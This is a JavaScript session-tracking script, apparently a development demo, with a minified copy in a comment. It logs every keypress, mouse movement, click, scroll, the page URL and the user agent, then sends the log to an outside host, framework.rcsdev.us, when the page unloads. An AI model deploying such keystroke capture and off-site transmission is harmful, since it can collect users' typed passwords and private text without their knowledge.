function SJAX(url) {
  if (window.XMLHttpRequest) {              
    AJAX=new XMLHttpRequest();              
  } else {                                  
    AJAX=new ActiveXObject("Microsoft.XMLHTTP");
  }
  if (AJAX) {
     AJAX.open("GET", url, false);                             
     AJAX.send(null);
     return AJAX.responseText;                                         
  } else {
     return false;
  }                                             
}


// Detect if the browser is IE or not.
// If it is not IE, we assume that the browser is NS.
var IE;
if(document.all)
{
	IE = true;
}
else
{
	IE = false;
}

// If NS -- that is, !IE -- then set up for mouse capture
if (!IE){
	document.captureEvents(Event.MOUSEMOVE);
}

// Set-up to use getMouseXY function onMouseMove
document.onmousemove = getMouseXY;
document.onmousedown = getMousePressed;
window.onload = getPageLoad;
window.onscroll = getPageScroll;
window.onunload = getPageUnLoad;
window.onkeypress = getKeyPress;

// Temporary variables to hold mouse x-y pos.s
var tempX = 0;
var tempY = 0;
var lastTimestamp = null;

function getKeyPress(e){
	var keynum;
	var keychar;
	var numcheck;

	if(window.event) // IE
	  {
	  keynum = e.keyCode;
	  }
	else if(e.which) // Netscape/Firefox/Opera
	  {
	  keynum = e.which;
	  }
	keychar = String.fromCharCode(keynum);
	var timestamp;
	timestamp = new Date().getTime();
	document.getElementById("tracking-output").innerHTML += "kp:"+keychar+"|"+":"+timestamp+"\r\n";
	return true;
	
}

function getPageUnLoad(e){
	encode=encodeURIComponent;
	var information;
	information = encode(document.getElementById("tracking-output").innerHTML);
	SJAX("http://framework.rcsdev.us/Index/Index/Index.html?stats="+information);
}

function getPageScroll(e){
	if (IE) { // grab the x-y pos.s if browser is IE
		tempX = event.clientX + document.body.scrollLeft;
	    tempY = event.clientY + document.body.scrollTop;
	} else {  // grab the x-y pos.s if browser is NS
	    tempX = e.pageX;
	    tempY = e.pageY;
	}  
	// catch possible negative values in NS4
	if (tempX < 0){
		tempX = 0;
	}
	if (tempY < 0){
		tempY = 0;
	}  
	// show the position values in the form named Show
	// in the text fields named MouseX and MouseY
	var timestamp;
	timestamp = new Date().getTime();
	document.getElementById("tracking-output").innerHTML += "sc:"+tempX+"|"+tempY+":"+timestamp+"\r\n";
	return true;
}
function getPageLoad(e) {
	var myWidth = 0, myHeight = 0;
	if( typeof( window.innerWidth ) == 'number' ) {
		//	Non-IE
		myWidth = window.innerWidth;
		myHeight = window.innerHeight;
	} else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {
		//IE 6+ in 'standards compliant mode'
		myWidth = document.documentElement.clientWidth;
		myHeight = document.documentElement.clientHeight;
	} else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
		//IE 4 compatible
		myWidth = document.body.clientWidth;
		myHeight = document.body.clientHeight;
	}
  
	var timestamp;
	timestamp = new Date().getTime();
	lastTimestamp = timestamp;
	var url;
	url = document.location.href;
	document.getElementById("tracking-output").innerHTML += "##########################\r\n";
	document.getElementById("tracking-output").innerHTML += "pl:"+url+"|:"+timestamp+"\r\n";
	document.getElementById("tracking-output").innerHTML += "ps:"+myWidth+"|"+myHeight+":"+timestamp+"\r\n";
	document.getElementById("tracking-output").innerHTML += "ua:"+navigator.userAgent+"|"+":"+timestamp+"\r\n";
	return true;
}
function getMousePressed(e) {
	if (IE) { // grab the x-y pos.s if browser is IE
		tempX = event.clientX + document.body.scrollLeft;
	    tempY = event.clientY + document.body.scrollTop;
	} else {  // grab the x-y pos.s if browser is NS
	    tempX = e.pageX;
	    tempY = e.pageY;
	}  
	// catch possible negative values in NS4
	if (tempX < 0){
		tempX = 0;
	}
	if (tempY < 0){
		tempY = 0;
	}  
	// show the position values in the form named Show
	// in the text fields named MouseX and MouseY
	var timestamp;
	timestamp = new Date().getTime();
	document.getElementById("tracking-output").innerHTML += "mc:"+tempX+"|"+tempY+":"+timestamp+"\r\n";
	return true;
	
}
function getMouseXY(e) {
	if (IE) { // grab the x-y pos.s if browser is IE
		tempX = event.clientX + document.body.scrollLeft;
	    tempY = event.clientY + document.body.scrollTop;
	} else {  // grab the x-y pos.s if browser is NS
	    tempX = e.pageX;
	    tempY = e.pageY;
	}  
	// catch possible negative values in NS4
	if (tempX < 0){
		tempX = 0;
	}
	if (tempY < 0){
		tempY = 0;
	} 
	// show the position values in the form named Show
	// in the text fields named MouseX and MouseY
	document.Show.MouseX.value = tempX
	document.Show.MouseY.value = tempY
	var timestamp;
	timestamp = new Date().getTime();
	if(timestamp-lastTimestamp >10)
	{	
		lastTimestamp = timestamp;
		document.getElementById("tracking-output").innerHTML += "mm:"+tempX+"|"+tempY+":"+timestamp+"\r\n";
	}
	return true;
}

//function SJAX(A){if(window.XMLHttpRequest){AJAX=new XMLHttpRequest()}else{AJAX=new ActiveXObject("Microsoft.XMLHTTP")}if(AJAX){AJAX.open("GET",A,false);AJAX.send(null);return AJAX.responseText}else{return false}}var IE;if(document.all){IE=true}else{IE=false}if(!IE){document.captureEvents(Event.MOUSEMOVE)}document.onmousemove=getMouseXY;document.onmousedown=getMousePressed;window.onload=getPageLoad;window.onscroll=getPageScroll;window.onunload=getPageUnLoad;window.onkeypress=getKeyPress;var tempX=0;var tempY=0;var lastTimestamp=null;function getKeyPress(C){var E;var D;var B;if(window.event){E=C.keyCode}else{if(C.which){E=C.which}}D=String.fromCharCode(E);var A;A=new Date().getTime();document.getElementById("tracking-output").innerHTML+="kp:"+D+"|:"+A+"\r\n";return true}function getPageUnLoad(B){encode=encodeURIComponent;var A;A=encode(document.getElementById("tracking-output").innerHTML);SJAX("http://framework.rcsdev.us/Index/Index/Index.html?stats="+A)}function getPageScroll(B){if(IE){tempX=event.clientX+document.body.scrollLeft;tempY=event.clientY+document.body.scrollTop}else{tempX=B.pageX;tempY=B.pageY}if(tempX<0){tempX=0}if(tempY<0){tempY=0}var A;A=new Date().getTime();document.getElementById("tracking-output").innerHTML+="sc:"+tempX+"|"+tempY+":"+A+"\r\n";return true}function getPageLoad(E){var B=0,A=0;if(typeof (window.innerWidth)=="number"){B=window.innerWidth;A=window.innerHeight}else{if(document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)){B=document.documentElement.clientWidth;A=document.documentElement.clientHeight}else{if(document.body&&(document.body.clientWidth||document.body.clientHeight)){B=document.body.clientWidth;A=document.body.clientHeight}}}var D;D=new Date().getTime();lastTimestamp=D;var C;C=document.location.href;document.getElementById("tracking-output").innerHTML+="##########################\r\n";document.getElementById("tracking-output").innerHTML+="pl:"+C+"|:"+D+"\r\n";document.getElementById("tracking-output").innerHTML+="ps:"+B+"|"+A+":"+D+"\r\n";document.getElementById("tracking-output").innerHTML+="ua:"+navigator.userAgent+"|:"+D+"\r\n";return true}function getMousePressed(B){if(IE){tempX=event.clientX+document.body.scrollLeft;tempY=event.clientY+document.body.scrollTop}else{tempX=B.pageX;tempY=B.pageY}if(tempX<0){tempX=0}if(tempY<0){tempY=0}var A;A=new Date().getTime();document.getElementById("tracking-output").innerHTML+="mc:"+tempX+"|"+tempY+":"+A+"\r\n";return true}function getMouseXY(B){if(IE){tempX=event.clientX+document.body.scrollLeft;tempY=event.clientY+document.body.scrollTop}else{tempX=B.pageX;tempY=B.pageY}if(tempX<0){tempX=0}if(tempY<0){tempY=0}document.Show.MouseX.value=tempX;document.Show.MouseY.value=tempY;var A;A=new Date().getTime();if(A-lastTimestamp>10){lastTimestamp=A;document.getElementById("tracking-output").innerHTML+="mm:"+tempX+"|"+tempY+":"+A+"\r\n"}return true};
//http://compressorrater.thruhere.net/